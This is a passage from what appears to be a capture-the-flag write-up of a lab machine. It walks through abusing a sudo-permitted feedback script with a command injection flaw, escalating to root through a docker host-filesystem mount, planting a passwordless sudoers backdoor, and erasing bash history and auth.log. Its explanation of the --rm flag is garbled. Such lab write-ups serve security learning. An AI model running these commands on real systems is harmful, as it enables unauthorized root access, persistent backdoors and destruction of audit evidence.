4. Stage 4 - Privilege Escalation
Process of gaining higher level permissions than what was initially granted. 

Check Sudo permission:
<sudo -l>
- it lists all commands that the current user (robin) is allowed to run. 

What we found: robin can run <feedback.sh> as user "jerry" without a password. 

Exploit feedback.sh:
<cd /home/robin/project>
<sudo -u jerry ./feedback.sh>

The sript content it showed: 
#!/bin/bash
clear
echo -e "Script For FeedBack\n"
read -p "Enter Your Name : " name
echo ""
read -p "Enter You Feedback About This Target Machine : " feedback
echo ""
$feedback 2>/dev/null
echo -e "\nThanks For Your Feedback ... !\n"

The key vulnerability is <$feedback 2>/dev/null>, whatever is typed in the feedback field gets executed
as a command.
This is called as "Command Injection Vulnerability"

When prompted:
Enter Your Name: <anything>
Enter Your Feedback: /bin/bash -i

Read Second Flag: 
<cat /home/jerry/user2.txt>

Escalate to root via Docker:
<docker run -v /:/mnt --rm -it alpine chroot /mnt sh>

<docker run> - starts a new docker container
<-v /:/mnt> mounts the host's entire filesystem(/) inside the container at /mnt 
<--rm> - automatically removes mode with a terminal
<alpine> uses the lightweight alpine linux image
<chroot /mnt sh> - changes the root directory

5. Stage 5 - Maintain Access
To ensures the attacker can return to the system even if the initial vulnerability is patched. It 
is done by creating backdoors or persistent access methods. 

<echo "echo 'robin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"> backup.sh>
This created a script that adds robin to the sudoers file with full passwordless sudo access. 

6. Stage 6 - Clear Tracks 
After completing attack, attacker would remove evidence of their presence to avoid detection by system
administrators or security tools. 

<history -c> -clears the current session's command history from memory
<rm -rf ~/.bash_history> -permanently deletes the bash hsitory file
<truncate -s 0 /var/log/auth.log> - empties the authentication log which records all login attempts and
sudo usage

